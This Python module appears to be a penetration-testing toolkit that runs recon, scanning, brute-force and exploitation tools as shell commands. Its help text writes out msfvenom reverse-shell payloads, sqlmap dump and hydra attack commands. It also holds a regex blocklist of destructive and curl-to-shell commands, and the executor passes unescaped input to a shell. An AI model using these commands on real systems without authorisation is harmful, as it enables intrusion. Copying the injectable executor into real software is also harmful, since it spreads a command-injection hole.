"""
A2A CYBER - SECURITY TOOLS LIBRARY

Comprehensive security tools integration for:
- OSINT & Reconnaissance
- Network Scanning
- Web Application Testing
- Exploitation
- Password Attacks
- Forensics
- Wireless
- Reverse Engineering

Each tool checks availability and provides helpful error messages.
"""

import os
import re
import json
import subprocess
import asyncio
import shutil
from typing import Dict, Any, List, Optional, Tuple
from datetime import datetime
import logging

logger = logging.getLogger(__name__)


# =============================================================================
# TOOL AVAILABILITY CHECKER
# =============================================================================

def check_tool(name: str) -> bool:
    """Check if a tool is available on the system."""
    return shutil.which(name) is not None


def get_available_tools() -> Dict[str, bool]:
    """Get availability status of all security tools."""
    tools = {
        # OSINT
        "theHarvester": check_tool("theHarvester") or check_tool("theharvester"),
        "recon-ng": check_tool("recon-ng"),
        "maltego": check_tool("maltego"),
        "spiderfoot": check_tool("spiderfoot"),
        "shodan": check_tool("shodan"),
        "amass": check_tool("amass"),
        "subfinder": check_tool("subfinder"),
        
        # DNS & Network
        "dig": check_tool("dig"),
        "nslookup": check_tool("nslookup"),
        "whois": check_tool("whois"),
        "host": check_tool("host"),
        "dnsrecon": check_tool("dnsrecon"),
        "dnsenum": check_tool("dnsenum"),
        "fierce": check_tool("fierce"),
        
        # Port Scanning
        "nmap": check_tool("nmap"),
        "masscan": check_tool("masscan"),
        "rustscan": check_tool("rustscan"),
        "unicornscan": check_tool("unicornscan"),
        
        # Web Scanning
        "nikto": check_tool("nikto"),
        "whatweb": check_tool("whatweb"),
        "wappalyzer": check_tool("wappalyzer"),
        "wafw00f": check_tool("wafw00f"),
        
        # Directory/File Discovery
        "gobuster": check_tool("gobuster"),
        "dirsearch": check_tool("dirsearch"),
        "dirb": check_tool("dirb"),
        "wfuzz": check_tool("wfuzz"),
        "ffuf": check_tool("ffuf"),
        "feroxbuster": check_tool("feroxbuster"),
        
        # Vulnerability Scanning
        "nuclei": check_tool("nuclei"),
        "nikto": check_tool("nikto"),
        "wpscan": check_tool("wpscan"),
        "joomscan": check_tool("joomscan"),
        "sqlmap": check_tool("sqlmap"),
        "xsstrike": check_tool("xsstrike"),
        
        # Exploitation
        "msfconsole": check_tool("msfconsole"),
        "msfvenom": check_tool("msfvenom"),
        "searchsploit": check_tool("searchsploit"),
        "metasploit": check_tool("msfconsole"),
        
        # Password Attacks
        "hydra": check_tool("hydra"),
        "john": check_tool("john"),
        "hashcat": check_tool("hashcat"),
        "medusa": check_tool("medusa"),
        "ncrack": check_tool("ncrack"),
        "cewl": check_tool("cewl"),
        "crunch": check_tool("crunch"),
        
        # Network Tools
        "netcat": check_tool("nc") or check_tool("netcat") or check_tool("ncat"),
        "tcpdump": check_tool("tcpdump"),
        "wireshark": check_tool("wireshark") or check_tool("tshark"),
        "ettercap": check_tool("ettercap"),
        "arpspoof": check_tool("arpspoof"),
        "bettercap": check_tool("bettercap"),
        
        # Wireless
        "aircrack-ng": check_tool("aircrack-ng"),
        "airodump-ng": check_tool("airodump-ng"),
        "wifite": check_tool("wifite"),
        "reaver": check_tool("reaver"),
        
        # Web Proxies
        "burpsuite": check_tool("burpsuite"),
        "zaproxy": check_tool("zaproxy") or check_tool("zap"),
        "mitmproxy": check_tool("mitmproxy"),
        
        # Forensics
        "volatility": check_tool("volatility") or check_tool("vol.py"),
        "binwalk": check_tool("binwalk"),
        "foremost": check_tool("foremost"),
        "autopsy": check_tool("autopsy"),
        "sleuthkit": check_tool("mmls"),
        
        # Reverse Engineering
        "ghidra": check_tool("ghidra") or check_tool("ghidraRun"),
        "radare2": check_tool("r2") or check_tool("radare2"),
        "gdb": check_tool("gdb"),
        "objdump": check_tool("objdump"),
        "strings": check_tool("strings"),
        
        # Misc
        "curl": check_tool("curl"),
        "wget": check_tool("wget"),
        "git": check_tool("git"),
        "python3": check_tool("python3"),
        "netstat": check_tool("netstat"),
        "ss": check_tool("ss"),
        "traceroute": check_tool("traceroute"),
        "ping": check_tool("ping"),
    }
    return tools


# =============================================================================
# TOOL CATEGORIES
# =============================================================================

TOOL_CATEGORIES = {
    "osint": {
        "name": "OSINT & Reconnaissance",
        "description": "Open Source Intelligence gathering",
        "tools": ["theHarvester", "recon-ng", "shodan", "amass", "subfinder", "spiderfoot"]
    },
    "dns": {
        "name": "DNS & Domain",
        "description": "DNS enumeration and analysis",
        "tools": ["dig", "nslookup", "whois", "host", "dnsrecon", "dnsenum", "fierce"]
    },
    "scanning": {
        "name": "Port Scanning",
        "description": "Network and port scanning",
        "tools": ["nmap", "masscan", "rustscan", "unicornscan"]
    },
    "web": {
        "name": "Web Application",
        "description": "Web vulnerability scanning",
        "tools": ["nikto", "whatweb", "wafw00f", "wpscan", "sqlmap", "nuclei"]
    },
    "discovery": {
        "name": "Directory Discovery",
        "description": "Web content discovery",
        "tools": ["gobuster", "dirsearch", "dirb", "wfuzz", "ffuf", "feroxbuster"]
    },
    "exploit": {
        "name": "Exploitation",
        "description": "Exploit frameworks and tools",
        "tools": ["msfconsole", "msfvenom", "searchsploit"]
    },
    "password": {
        "name": "Password Attacks",
        "description": "Password cracking and brute force",
        "tools": ["hydra", "john", "hashcat", "medusa", "ncrack"]
    },
    "network": {
        "name": "Network Tools",
        "description": "Network analysis and attacks",
        "tools": ["netcat", "tcpdump", "wireshark", "bettercap"]
    },
    "wireless": {
        "name": "Wireless",
        "description": "Wireless network attacks",
        "tools": ["aircrack-ng", "wifite", "reaver"]
    },
    "forensics": {
        "name": "Forensics",
        "description": "Digital forensics tools",
        "tools": ["volatility", "binwalk", "foremost", "autopsy"]
    },
    "reversing": {
        "name": "Reverse Engineering",
        "description": "Binary analysis",
        "tools": ["ghidra", "radare2", "gdb", "objdump"]
    }
}


# =============================================================================
# COMMAND EXECUTOR
# =============================================================================

class CommandExecutor:
    """Execute security tool commands safely."""
    
    # Dangerous patterns to block
    BLOCKED_PATTERNS = [
        r'rm\s+-rf\s+/',
        r'mkfs\.',
        r'dd\s+if=.*of=/dev/',
        r'>\s*/dev/sd',
        r'chmod\s+777\s+/',
        r':\(\)\s*\{',  # fork bomb
        r'wget.*\|\s*sh',
        r'curl.*\|\s*sh',
    ]
    
    # Commands that need root
    ROOT_COMMANDS = ['masscan', 'tcpdump', 'ettercap', 'arpspoof', 'airodump-ng', 'aircrack-ng']
    
    def __init__(self, timeout: int = 300):
        self.timeout = timeout
        self.results = []
    
    def is_safe(self, cmd: str) -> Tuple[bool, str]:
        """Check if command is safe to execute."""
        for pattern in self.BLOCKED_PATTERNS:
            if re.search(pattern, cmd, re.IGNORECASE):
                return False, f"Blocked: dangerous pattern detected"
        return True, ""
    
    async def execute(self, cmd: str, timeout: Optional[int] = None) -> Dict[str, Any]:
        """Execute a command and return results."""
        timeout = timeout or self.timeout
        timestamp = datetime.now().isoformat()
        
        # Safety check
        safe, reason = self.is_safe(cmd)
        if not safe:
            return {
                "success": False,
                "command": cmd,
                "error": reason,
                "timestamp": timestamp
            }
        
        # Check if tool exists
        tool = cmd.split()[0]
        if not check_tool(tool):
            return {
                "success": False,
                "command": cmd,
                "error": f"Tool '{tool}' not found. Install it first.",
                "timestamp": timestamp,
                "suggestion": self._get_install_suggestion(tool)
            }
        
        try:
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )
            
            result = {
                "success": process.returncode == 0,
                "command": cmd,
                "stdout": stdout.decode('utf-8', errors='replace'),
                "stderr": stderr.decode('utf-8', errors='replace'),
                "returncode": process.returncode,
                "timestamp": timestamp
            }
            
            self.results.append(result)
            return result
            
        except asyncio.TimeoutError:
            return {
                "success": False,
                "command": cmd,
                "error": f"Command timed out after {timeout}s",
                "timestamp": timestamp
            }
        except Exception as e:
            return {
                "success": False,
                "command": cmd,
                "error": str(e),
                "timestamp": timestamp
            }
    
    def _get_install_suggestion(self, tool: str) -> str:
        """Get installation suggestion for a tool."""
        install_map = {
            "nmap": "brew install nmap  # or: apt install nmap",
            "masscan": "brew install masscan  # or: apt install masscan",
            "gobuster": "go install github.com/OJ/gobuster/v3@latest",
            "dirsearch": "pip install dirsearch  # or: git clone https://github.com/maurosoria/dirsearch",
            "wfuzz": "pip install wfuzz",
            "ffuf": "go install github.com/ffuf/ffuf@latest  # or: brew install ffuf",
            "nuclei": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
            "subfinder": "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
            "amass": "go install github.com/owasp-amass/amass/v4/...@master",
            "theHarvester": "pip install theHarvester  # or: apt install theharvester",
            "shodan": "pip install shodan",
            "sqlmap": "pip install sqlmap  # or: apt install sqlmap",
            "nikto": "brew install nikto  # or: apt install nikto",
            "hydra": "brew install hydra  # or: apt install hydra",
            "john": "brew install john  # or: apt install john",
            "hashcat": "brew install hashcat  # or: apt install hashcat",
            "metasploit": "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall",
            "msfconsole": "See metasploit installation",
            "msfvenom": "See metasploit installation",
            "searchsploit": "apt install exploitdb  # or: git clone https://github.com/offensive-security/exploitdb",
            "wpscan": "gem install wpscan",
            "bettercap": "brew install bettercap  # or: apt install bettercap",
            "rustscan": "cargo install rustscan  # or: brew install rustscan",
            "feroxbuster": "cargo install feroxbuster  # or: brew install feroxbuster",
        }
        return install_map.get(tool, f"Search: 'install {tool} on kali/macos'")


# =============================================================================
# TOOL WRAPPERS
# =============================================================================

class SecurityTools:
    """High-level security tool wrappers."""
    
    def __init__(self):
        self.executor = CommandExecutor()
        self.available = get_available_tools()
    
    # -------------------------------------------------------------------------
    # OSINT
    # -------------------------------------------------------------------------
    
    async def theharvester(self, domain: str, sources: str = "all") -> Dict[str, Any]:
        """Run theHarvester for email/subdomain enumeration."""
        cmd = f"theHarvester -d {domain} -b {sources} -l 500"
        return await self.executor.execute(cmd, timeout=300)
    
    async def shodan_search(self, query: str) -> Dict[str, Any]:
        """Search Shodan for targets."""
        cmd = f"shodan search '{query}' --limit 100"
        return await self.executor.execute(cmd, timeout=60)
    
    async def shodan_host(self, ip: str) -> Dict[str, Any]:
        """Get Shodan info for an IP."""
        cmd = f"shodan host {ip}"
        return await self.executor.execute(cmd, timeout=30)
    
    async def amass_enum(self, domain: str, passive: bool = True) -> Dict[str, Any]:
        """Run Amass subdomain enumeration."""
        mode = "-passive" if passive else ""
        cmd = f"amass enum {mode} -d {domain} -timeout 10"
        return await self.executor.execute(cmd, timeout=600)
    
    async def subfinder(self, domain: str) -> Dict[str, Any]:
        """Run subfinder for subdomain discovery."""
        cmd = f"subfinder -d {domain} -silent"
        return await self.executor.execute(cmd, timeout=120)
    
    # -------------------------------------------------------------------------
    # DNS
    # -------------------------------------------------------------------------
    
    async def dig(self, target: str, record_type: str = "ANY") -> Dict[str, Any]:
        """DNS lookup with dig."""
        cmd = f"dig {target} {record_type} +noall +answer"
        return await self.executor.execute(cmd, timeout=30)
    
    async def nslookup(self, target: str) -> Dict[str, Any]:
        """DNS lookup with nslookup."""
        cmd = f"nslookup {target}"
        return await self.executor.execute(cmd, timeout=30)
    
    async def whois(self, target: str) -> Dict[str, Any]:
        """WHOIS lookup."""
        cmd = f"whois {target}"
        return await self.executor.execute(cmd, timeout=30)
    
    async def dnsrecon(self, domain: str) -> Dict[str, Any]:
        """DNS reconnaissance with dnsrecon."""
        cmd = f"dnsrecon -d {domain} -t std,brt"
        return await self.executor.execute(cmd, timeout=300)
    
    # -------------------------------------------------------------------------
    # PORT SCANNING
    # -------------------------------------------------------------------------
    
    async def nmap(self, target: str, options: str = "-sV -sC") -> Dict[str, Any]:
        """Run nmap scan."""
        cmd = f"nmap {options} {target}"
        return await self.executor.execute(cmd, timeout=600)
    
    async def nmap_quick(self, target: str) -> Dict[str, Any]:
        """Quick nmap scan."""
        cmd = f"nmap -Pn -F --open {target}"
        return await self.executor.execute(cmd, timeout=120)
    
    async def nmap_full(self, target: str) -> Dict[str, Any]:
        """Full nmap scan."""
        cmd = f"nmap -sV -sC -A -p- {target}"
        return await self.executor.execute(cmd, timeout=3600)
    
    async def nmap_vuln(self, target: str) -> Dict[str, Any]:
        """Nmap vulnerability scan."""
        cmd = f"nmap --script vuln {target}"
        return await self.executor.execute(cmd, timeout=600)
    
    async def masscan(self, target: str, ports: str = "1-65535", rate: int = 1000) -> Dict[str, Any]:
        """Run masscan (requires root)."""
        cmd = f"masscan {target} -p{ports} --rate={rate}"
        return await self.executor.execute(cmd, timeout=600)
    
    async def rustscan(self, target: str) -> Dict[str, Any]:
        """Run rustscan for fast port discovery."""
        cmd = f"rustscan -a {target} --ulimit 5000"
        return await self.executor.execute(cmd, timeout=300)
    
    # -------------------------------------------------------------------------
    # WEB SCANNING
    # -------------------------------------------------------------------------
    
    async def nikto(self, target: str) -> Dict[str, Any]:
        """Run Nikto web scanner."""
        cmd = f"nikto -h {target} -Tuning x"
        return await self.executor.execute(cmd, timeout=600)
    
    async def whatweb(self, target: str) -> Dict[str, Any]:
        """Run WhatWeb fingerprinting."""
        cmd = f"whatweb {target} -a 3"
        return await self.executor.execute(cmd, timeout=120)
    
    async def wafw00f(self, target: str) -> Dict[str, Any]:
        """Detect WAF with wafw00f."""
        cmd = f"wafw00f {target}"
        return await self.executor.execute(cmd, timeout=60)
    
    async def wpscan(self, target: str) -> Dict[str, Any]:
        """WordPress vulnerability scan."""
        cmd = f"wpscan --url {target} --enumerate vp,vt,u"
        return await self.executor.execute(cmd, timeout=600)
    
    # -------------------------------------------------------------------------
    # DIRECTORY DISCOVERY
    # -------------------------------------------------------------------------
    
    async def gobuster(self, target: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt") -> Dict[str, Any]:
        """Run gobuster directory brute force."""
        cmd = f"gobuster dir -u {target} -w {wordlist} -t 50"
        return await self.executor.execute(cmd, timeout=600)
    
    async def dirsearch(self, target: str) -> Dict[str, Any]:
        """Run dirsearch."""
        cmd = f"dirsearch -u {target} -e php,asp,aspx,jsp,html,js -t 50"
        return await self.executor.execute(cmd, timeout=600)
    
    async def wfuzz(self, target: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt") -> Dict[str, Any]:
        """Run wfuzz."""
        cmd = f"wfuzz -c -z file,{wordlist} --hc 404 {target}/FUZZ"
        return await self.executor.execute(cmd, timeout=600)
    
    async def ffuf(self, target: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt") -> Dict[str, Any]:
        """Run ffuf fuzzer."""
        cmd = f"ffuf -u {target}/FUZZ -w {wordlist} -mc 200,301,302,403"
        return await self.executor.execute(cmd, timeout=600)
    
    async def feroxbuster(self, target: str) -> Dict[str, Any]:
        """Run feroxbuster."""
        cmd = f"feroxbuster -u {target} -t 50"
        return await self.executor.execute(cmd, timeout=600)
    
    # -------------------------------------------------------------------------
    # VULNERABILITY SCANNING
    # -------------------------------------------------------------------------
    
    async def nuclei(self, target: str, templates: str = "") -> Dict[str, Any]:
        """Run Nuclei vulnerability scanner."""
        template_opt = f"-t {templates}" if templates else ""
        cmd = f"nuclei -u {target} {template_opt} -severity critical,high,medium"
        return await self.executor.execute(cmd, timeout=600)
    
    async def sqlmap(self, url: str, options: str = "--batch") -> Dict[str, Any]:
        """Run SQLMap."""
        cmd = f"sqlmap -u '{url}' {options}"
        return await self.executor.execute(cmd, timeout=600)
    
    # -------------------------------------------------------------------------
    # EXPLOITATION
    # -------------------------------------------------------------------------
    
    async def searchsploit(self, query: str) -> Dict[str, Any]:
        """Search ExploitDB."""
        cmd = f"searchsploit {query}"
        return await self.executor.execute(cmd, timeout=30)
    
    async def msfvenom(self, payload: str, lhost: str, lport: str, format: str = "raw") -> Dict[str, Any]:
        """Generate payload with msfvenom."""
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format}"
        return await self.executor.execute(cmd, timeout=60)
    
    async def msfconsole_resource(self, resource_file: str) -> Dict[str, Any]:
        """Run msfconsole with resource file."""
        cmd = f"msfconsole -r {resource_file} -q"
        return await self.executor.execute(cmd, timeout=300)
    
    # -------------------------------------------------------------------------
    # PASSWORD ATTACKS
    # -------------------------------------------------------------------------
    
    async def hydra(self, target: str, service: str, user: str, wordlist: str) -> Dict[str, Any]:
        """Run Hydra password attack."""
        cmd = f"hydra -l {user} -P {wordlist} {target} {service}"
        return await self.executor.execute(cmd, timeout=600)
    
    async def john(self, hash_file: str, wordlist: str = "") -> Dict[str, Any]:
        """Run John the Ripper."""
        wl_opt = f"--wordlist={wordlist}" if wordlist else ""
        cmd = f"john {hash_file} {wl_opt}"
        return await self.executor.execute(cmd, timeout=3600)
    
    async def hashcat(self, hash_file: str, mode: str, wordlist: str) -> Dict[str, Any]:
        """Run hashcat."""
        cmd = f"hashcat -m {mode} {hash_file} {wordlist}"
        return await self.executor.execute(cmd, timeout=3600)
    
    # -------------------------------------------------------------------------
    # NETWORK TOOLS
    # -------------------------------------------------------------------------
    
    async def netcat(self, host: str, port: int, options: str = "") -> Dict[str, Any]:
        """Run netcat."""
        cmd = f"nc {options} {host} {port}"
        return await self.executor.execute(cmd, timeout=30)
    
    async def tcpdump(self, interface: str = "any", filter: str = "", count: int = 100) -> Dict[str, Any]:
        """Capture packets with tcpdump."""
        filter_opt = f"'{filter}'" if filter else ""
        cmd = f"tcpdump -i {interface} -c {count} {filter_opt}"
        return await self.executor.execute(cmd, timeout=60)
    
    # -------------------------------------------------------------------------
    # UTILITY
    # -------------------------------------------------------------------------
    
    async def curl(self, url: str, options: str = "-sI") -> Dict[str, Any]:
        """Make HTTP request with curl."""
        cmd = f"curl {options} '{url}'"
        return await self.executor.execute(cmd, timeout=30)
    
    async def wget(self, url: str, output: str = "") -> Dict[str, Any]:
        """Download file with wget."""
        out_opt = f"-O {output}" if output else ""
        cmd = f"wget {out_opt} '{url}'"
        return await self.executor.execute(cmd, timeout=120)
    
    def get_status(self) -> Dict[str, Any]:
        """Get tool availability status."""
        available = get_available_tools()
        installed = [t for t, v in available.items() if v]
        missing = [t for t, v in available.items() if not v]
        
        return {
            "total": len(available),
            "installed": len(installed),
            "missing": len(missing),
            "tools": {
                "installed": installed,
                "missing": missing
            },
            "categories": TOOL_CATEGORIES
        }


# =============================================================================
# TOOL HELP GENERATOR
# =============================================================================

def get_tool_help(tool: str) -> str:
    """Get help information for a tool."""
    help_map = {
        "nmap": """# NMAP - Network Scanner

## Quick Scan
```bash
nmap -F target.com
```

## Service Detection
```bash
nmap -sV -sC target.com
```

## Full Scan
```bash
nmap -sV -sC -A -p- target.com
```

## Vulnerability Scan
```bash
nmap --script vuln target.com
```

## Stealth Scan
```bash
nmap -sS -Pn target.com
```
""",
        "gobuster": """# GOBUSTER - Directory Brute Force

## Directory Mode
```bash
gobuster dir -u http://target.com -w /path/to/wordlist.txt
```

## DNS Mode
```bash
gobuster dns -d target.com -w subdomains.txt
```

## VHOST Mode
```bash
gobuster vhost -u http://target.com -w vhosts.txt
```
""",
        "sqlmap": """# SQLMAP - SQL Injection

## Basic Scan
```bash
sqlmap -u "http://target.com/page?id=1"
```

## Get Databases
```bash
sqlmap -u "http://target.com/page?id=1" --dbs
```

## Dump Table
```bash
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
```

## POST Data
```bash
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"
```
""",
        "hydra": """# HYDRA - Password Brute Force

## SSH
```bash
hydra -l admin -P wordlist.txt ssh://target.com
```

## HTTP POST
```bash
hydra -l admin -P wordlist.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

## FTP
```bash
hydra -L users.txt -P passwords.txt ftp://target.com
```
""",
        "msfvenom": """# MSFVENOM - Payload Generator

## Windows Reverse Shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe
```

## Linux Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell.elf
```

## PHP Webshell
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php
```

## Python Payload
```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw
```
""",
        "theHarvester": """# THEHARVESTER - OSINT

## All Sources
```bash
theHarvester -d target.com -b all
```

## Specific Sources
```bash
theHarvester -d target.com -b google,linkedin,twitter
```

## With Screenshots
```bash
theHarvester -d target.com -b all -s
```
""",
        "nuclei": """# NUCLEI - Vulnerability Scanner

## Basic Scan
```bash
nuclei -u https://target.com
```

## Specific Templates
```bash
nuclei -u https://target.com -t cves/
```

## High Severity Only
```bash
nuclei -u https://target.com -severity critical,high
```

## Multiple Targets
```bash
nuclei -l targets.txt -t templates/
```
""",
        "shodan": """# SHODAN - Internet Scanner

## Search
```bash
shodan search "apache"
```

## Host Info
```bash
shodan host 1.2.3.4
```

## Count Results
```bash
shodan count "port:22"
```

## Download Results
```bash
shodan download results "apache"
```
"""
    }
    
    return help_map.get(tool, f"# {tool.upper()}\n\nNo detailed help available. Try: `{tool} --help`")


# =============================================================================
# QUICK ACCESS FUNCTIONS
# =============================================================================

async def quick_recon(target: str) -> Dict[str, Any]:
    """Quick reconnaissance of a target."""
    tools = SecurityTools()
    results = {}
    
    # DNS
    results['dns'] = await tools.dig(target)
    
    # WHOIS
    results['whois'] = await tools.whois(target)
    
    # Quick port scan
    results['ports'] = await tools.nmap_quick(target)
    
    # HTTP headers
    results['http'] = await tools.curl(f"https://{target}")
    
    return results


async def quick_web_scan(target: str) -> Dict[str, Any]:
    """Quick web application scan."""
    tools = SecurityTools()
    results = {}
    
    # Tech fingerprint
    results['tech'] = await tools.whatweb(target)
    
    # WAF detection
    results['waf'] = await tools.wafw00f(target)
    
    # Quick directory scan
    results['dirs'] = await tools.gobuster(target)
    
    return results


# =============================================================================
# EXPORT
# =============================================================================

__all__ = [
    'SecurityTools',
    'CommandExecutor', 
    'check_tool',
    'get_available_tools',
    'get_tool_help',
    'TOOL_CATEGORIES',
    'quick_recon',
    'quick_web_scan'
]
